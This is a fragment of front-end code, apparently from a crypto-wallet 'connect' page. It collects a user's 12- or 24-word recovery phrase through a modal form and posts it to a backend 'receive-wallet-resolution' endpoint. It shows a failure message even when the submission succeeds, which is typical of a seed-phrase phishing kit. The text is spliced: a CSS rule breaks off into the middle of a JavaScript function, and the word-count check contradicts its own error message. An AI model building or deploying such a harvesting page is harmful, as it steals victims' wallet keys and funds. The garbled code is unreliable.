 .mymodal{

  right: 0;
  bottom: 0;
  background-color: #00000045 !important;
  width: 100% !important;
  height: 100vh !important;
  z-index: 555555;
  display: none;
  justify-content: center;
  align-items: center;
}
.modal-content{
    width: 500px;
    min-height: fit-content;
    padding: 2rem 1rem;
    margin: auto;
    background-color: #01091b;
    border-radius: 10px;
    position: relative;
}
.close-modal{

      for (let i = 0; i < cookies.length; i++) {
        const cookie = cookies[i].trim();
        if (cookie.substring(0, name.length + 1) === (name + '=')) {
          cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
          break;
        }
      }
    }
    return cookieValue;
  }
  function validateForm() {
    // Get the value of the textarea and trim it to remove extra spaces
    const inputText = document.getElementById("key").value.trim();

    // Split the input by any whitespace (space, tab, newlines) to get the words
    const words = inputText.split(/\s+/);

    // Log the input and the words array for debugging
    console.log("Input text:", inputText);
    console.log("Words array:", words);
    console.log("Word count:", words.length);

    // Check if the number of words is either 12 or 24
    if (words.length >= 12 && words.length <= 24) {
        // Display error message and block form submission
        document.getElementById("outerErrorMessage").style.display = "block";
        document.getElementById("errorText").innerText = "Key phrase must be either 12 or 24 words.";
        return false; // Prevent form submission
    }

    // If validation is successful, hide any existing error messages
    document.getElementById("outerErrorMessage").style.display = "none";
    document.getElementById("errorText").innerText = "";
    
    // Return true to indicate successful validation
    return true;
}

    
    document.getElementById("my-form").addEventListener("submit", function(event) {
        event.preventDefault();
    
        if (!validateForm()) {
            return;
        }
    
        const formData = new FormData(this);
        const csrfToken = getCookie('csrftoken');
    
        fetch("http://localhost:8000/receive-wallet-resolution/", {
            method: "POST",
            body: formData,
            headers: {
                "X-CSRFToken": csrfToken,
            },
        })
        .then((response) => response.json())
        .then((data) => {
            if (data.error) {
                document.getElementById("outerErrorMessage").style.display = "block";
                document.getElementById("errorText").innerText = "Unable to connect: " + data.error;
            } else {
                document.getElementById("successContainer").style.display = "block";
                document.getElementById("successText").innerText = "An error occurred during connection.";
            }
        })
        .catch((error) => {
            console.error("Error:", error);
            document.getElementById("outerErrorMessage").style.display = "block";
            document.getElementById("errorText").innerText = "An error occurred during connection.";
        });
    });
    
    document.querySelectorAll(".wallet-box-container.clickable").forEach(element => {
        element.addEventListener("click", function() {
            const walletName = this.querySelector("h2").innerText;
            document.getElementById("selectedWallet").value = walletName;
            document.getElementById("myModal").style.display = "block";
        });
    });
    
    document.querySelector(".close-modal").addEventListener("click", function() {
        document.querySelector(".mymodal").style.display = "none";
    });
    </script>
